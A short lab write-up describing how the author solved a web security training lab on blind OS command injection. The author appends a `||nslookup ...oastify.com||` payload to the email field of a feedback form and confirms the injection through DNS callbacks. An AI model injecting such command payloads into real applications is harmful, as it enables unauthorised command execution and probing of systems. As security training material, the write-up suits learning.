Write-up by wook413

# Lab: Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

---

Since the lab description states that the feedback function is vulnerable to OS command injection, I navigated straight to the feedback page by clicking the **'Submit feedback'** button.

![image-20260729203342330](./lab4.assets/image-20260729203342330.png)

I filled out the form with arbitrary information and submitted it.

![image-20260729203413473](./lab4.assets/image-20260729203413473.png)

Then I pulled up the POST request I had just sent to the `/feedback/submit` endpoint.

![image-20260729203443286](./lab4.assets/image-20260729203443286.png)

Next, I navigated to Collaborator and clicked **'Copy to clipboard'** to copy an external domain.

![image-20260729203534875](./lab4.assets/image-20260729203534875.png)

In the previous labs, the `email` parameter was vulnerable, so I started by testing that parameter. I appended `||nslookup rb63kpcki9z1rdbm4f7tbjcktbz2ntbi.oastify.com||` to the value of the `email` parameter and sent the request.

![image-20260729203726708](./lab4.assets/image-20260729203726708.png)

I navigated back to Collaborator and clicked **'Poll now'**. It immediately showed two DNS requests, indicating that the out-of-band command injection payload had been executed.

![image-20260729203806903](./lab4.assets/image-20260729203806903.png)

### Solved!

![image-20260729203813434](./lab4.assets/image-20260729203813434.png)



